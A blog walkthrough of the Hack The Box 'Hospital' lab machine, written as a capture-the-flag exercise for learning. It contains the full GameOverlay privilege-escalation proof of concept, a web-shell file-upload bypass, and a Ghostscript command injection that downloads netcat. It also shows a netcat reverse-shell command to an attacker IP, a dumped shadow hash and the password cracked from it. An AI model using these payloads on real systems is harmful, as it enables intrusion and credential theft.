---
title: Hospital Writeup
date: 2024-02-29 18:00 +0100
author: Kyllano
categories: [HTB Writeup]
tags: [cybersecurity, htb, writeup]
---

## Recon

As always, let's start with an nmap

```
kyll@kyll-Latitude-3520:~$ nmap -sC -sV -Pn -p-10000 10.10.11.241
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 12:20 CET
Nmap scan report for 10.10.11.241
Host is up (0.034s latency).
Not shown: 9974 filtered ports
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-26 18:20:59Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-26T18:23:19+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2024-02-25T17:12:28
|_Not valid after:  2024-08-26T17:12:28
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6410/tcp open  msrpc             Microsoft Windows RPC
6618/tcp open  msrpc             Microsoft Windows RPC
6634/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Login
|_Requested resource was login.php
9389/tcp open  mc-nmf            .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/26%Time=65DC7420%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-26T18:23:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.07 seconds
```

This is a Windows machine, as we can see there's a lot of services running on it. There's `ssh`, a DNS, `kerberos`, `rpc`, and `https` website on 443, an active directory `ldap`, microsoft RPC, another website on port 8080 (which apparently runs some PHP). Since it is said to be running Ubuntu on port 22 (for the `ssh`), we can probably guess that this uses some WSL. So first things first, let's throw the redirect (`hospital.htb`) to our `/etc/hosts` file and visit both website that are running.

First the one on port 443 :

<img src="/assets/img/HospitalWriteup/hosp1.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Judging by the `Hospital Webmail` indication, the machine is probably running a mailing server. After trying some commmon default credentials, and enumerating the folders on that page (which yielded nothing), I can assert that without a username, it might lead to nothing to dwell on that page. Next stop is the server on port 8080 :

<img src="/assets/img/HospitalWriteup/hosp2.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

This prompts us for an account, and after making one, we are redirected on this page :

<img src="/assets/img/HospitalWriteup/hosp3.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

We can upload a file and it asks us for an image file. Before trying to exploit that, let's do a directory enumeration on that webpage :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools/ffuf$ ./ffuf -u http://hospital.htb:8080/FUZZ -w ../directories.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://hospital.htb:8080/FUZZ
 :: Wordlist         : FUZZ: /home/kyll/Desktop/code_folder/Tools/directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 34ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 29ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 29ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 3253ms]
vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 31ms]
fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 31ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 33ms]
:: Progress: [220546/220546] :: Job [1/1] :: 1098 req/sec :: Duration: [0:03:52] :: Errors: 0 ::
```

Looks like a uploads folder is present which is probably where the uploaded file will be residing, so let's get exploiting this

## Exploiting file upload

We've agreed that this website is capable of running some `PHP` since the URL once we are logged in is `http://hospital.htb:8080/index.php` and the nmap scan also told us so. We're able to upload a file, and it requires us to upload an image file, so let's try and find a PHP file that can act as an image. Once that PHP file is uploaded, we'll try to access it and the server will run the PHP code (which we'll control and make the server do whatever we want) A good list for file upload exploitation is found [here](https://book.hacktricks.xyz/pentesting-web/file-upload). Some good candidates are the `pgif` and `phar` format.

Now that we have our file formats, we need the malicious file to upload, and a well known good on browser shell spawner is [p0wny shell](https://github.com/flozz/p0wny-shell). So let's actually try and upload that as `pownyshell.pgif` and `pownyshell.phar`

Once we've uploaded it and clicked `upload`, we see this (any other more 'classic' php file format such as `php`, `php2` etc. yielded a `upload error : please try to upload your mediacl records again`):

<img src="/assets/img/HospitalWriteup/hosp4.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Now trying to visit the `http://hospital.htb:8080/upload/pownyshell.pgif` website :

<img src="/assets/img/HospitalWriteup/hosp5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

It looks like the `pgif` format cannot be completely well displayed, but the `phar` though:

<img src="/assets/img/HospitalWriteup/hosp6.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

This one works really well, we have an in-browser shell now! Let's check who we are and get a reverse shell from our terminal (obviously, the `-e` and `-c` options of netcat fon't work so let's use the mknod that we've used in previous boxes and explained in the [Cozy Hosting Writeup](https://kyllano.github.io/posts/CozyHostingWriteup/#exploiting-ssh-to-get-a-reverse-shell) :

<img src="/assets/img/HospitalWriteup/hosp7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And on our terminal :

<img src="/assets/img/HospitalWriteup/hosp8.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

## From WSL user to WSL root

Now that we've got the user `www-data`, we can try to do some privilege escalation. To do this, we try to launch linpeas, but we do not very obvious results. Let's check out the kernel version with `uname -r` (or present in the linpeas output) which is `5.19.0-35-generic`. Seaching  for `kernel 5.19.0-35 exploit` show us some [results](https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability) and that a GameOverlay vulnerability exists (CVE-2023-2640 and CVE-2023-32629).

Here's the proof of concept of the exploit and it is explained [here](https://blog.projectdiscovery.io/gameover-lay-local-privilege-escalation-in-ubuntu-kernel/):

```bash
unshare -rm sh -c
    "mkdir l u w m && cp /u*/b*/p*3 l/;
    setcap cap_setuid+eip l/python3;
    mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m
    && touch m/*;"
&& u/python3 -c '
    import os;
    os.setuid(0);
    os.system("
        cp /bin/bash /var/tmp/bash && 
        chmod 4755 /var/tmp/bash && 
        /var/tmp/bash -p && 
        rm -rf l m u w /var/tmp/bash
    ")
'
```

The vulnerability lays in the fact that an unprivileged user may be able to set privileged extended attributes on a file mounted via `OverlayFS`. So int the PoC we use OverlayFS to mount a directory then add some capabilities to python3 in that diretory (`cap_setuid`) which normally require root permissions to do so. Once that's done, python3 in that directory is able to copy the `bash` executable, change its permission to make it setuid (since it has root ownership) and run it, which in turns effectively grants us a root shell.

This PoC was in a GitHub repository right [here](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?tab=readme-ov-file). Obviously, the machine cannot  resolve `github.com` as a hostname, so we'll have to spin up our trusty Python http server and download it, then run the exploit :

<img src="/assets/img/HospitalWriteup/hosp9.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Alright we we're root here, we cannot really escape WSL jail froim here but we can probably get some credentials. Let's get that `/etc/shadow` file!

```
cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
[...]
www-data:*:19462:0:99999:7:::
[...]
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::

```

We've got some hashes! `root`'s password is probably autogenerated and not reused, but we can probably crack `drwilliams` password and reuse it in that mailserver we've seen earlier.

Let's crack that hash. First we need to check out what type of hash this is :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB$ hashid -j
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/ 
Analyzing '$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/'
[+] SHA-512 Crypt [JtR Format: sha512crypt]
```

Now to launch our john the ripper with the specified format and the classic `rockyou.txt` :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools$ john --format=sha512crypt --wordlist=rockyou.txt ../HTB/hospital/hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:12 0.71% (ETA: 00:26:20) 0g/s 9841p/s 9841c/s 9841C/s bratpack..042579
qwe123!@#        (drwilliams)     
1g 0:00:00:21 DONE (2024-02-26 23:58) 0g/s 9819p/s 9819c/s 9819C/s sexysis..pakala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We've found drwilliams's password : qwe123!@#

## Escaping WSL jail

Now that we've found the password and a username, we can try and use those to get into the mail server that we've found earlier. Note that this is a mailserver so the username will be mail addresses so they'll finish with `@domain.tld`. The domain being `hospital.htb`, the username becomes `drwilliams@hospital.htb`. Let's try and login :

<img src="/assets/img/HospitalWriteup/hosp10.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

We were able to login as drwilliams! We check out the only email from Dr Brown sent saying that he is waiting for a `.eps` file to be used with GhostScript. If we checkout `GhostScript exploit` on Google, we can see that [the CVE-2023-36664](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) exists and that it lets us do some injection into an eps file that will be executed when launched with GhostScript. 

It is said that the vulnerability emerges from these facts :

> It was discovered that Ghostscript, the GPL PostScript/PDF interpreter, 
> does not properly handle permission validation for pipe devices, which 
> could result in the execution of arbitrary commands if malformed 
> document files are processed.

> Artifex Ghostscript through 10.01.2 mishandles permission validation for
>  pipe devices (with the %pipe% prefix or the | pipe character prefix).

Not having the code nor more tangible explanation, I am not able to provide a more thorough explanation of what is going on with that exploit.

Nevertheless, we know that we can inject any command, so let's try and download netcat on the distant server. For that I'll have a Windows netcat program that will be downloaded from my python http.server. First let's inject our payload into our `.eps` file, as instructed in the GitHub page (our payloads download nc64.exe and rename it to nc.exe) :

<img src="/assets/img/HospitalWriteup/hosp11.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Now to send it in a response to the mail :

<img src="/assets/img/HospitalWriteup/hosp12.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And once that's done, our server serves the file as intended :

<img src="/assets/img/HospitalWriteup/hosp13.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Now we need to do the same with a reverse shell generated from [here](https://www.revshells.com/) (`nc 10.10.14.127 6969 -e cmd`), and we listen for an incoming connection :

<img src="/assets/img/HospitalWriteup/hosp14.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And we've gained access to the actual machine (not WSL) and got Dr Brown's account access (and thus have the user flag)

## Going administrator

Once we're on the system, we can navigate a little bit and find that `xampp` has a folder in the root of the system. Xampp is a PHP developement environement, so that means that if we can put a php webpage in the folder that serves `xampp` webpages, we might be able to use our previous `p0wny shell`. 

By default the webpages that are served in `xampp` are stored in the `xampp\htdocs` folder. So let's go there and curl our powny shell from our python webserver:

<img src="/assets/img/HospitalWriteup/hosp15.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Now to access that page from our browser :

<img src="/assets/img/HospitalWriteup/hosp16.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

We have administrator access. Let's do one last reverse shell using the netcat that we've already uploaded :

<img src="/assets/img/HospitalWriteup/hosp17.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

and on our terminal :

<img src="/assets/img/HospitalWriteup/hosp18.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And there we have it, we've pwned the box and we can get our root flag :

<img src="/assets/img/HospitalWriteup/hosp19.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>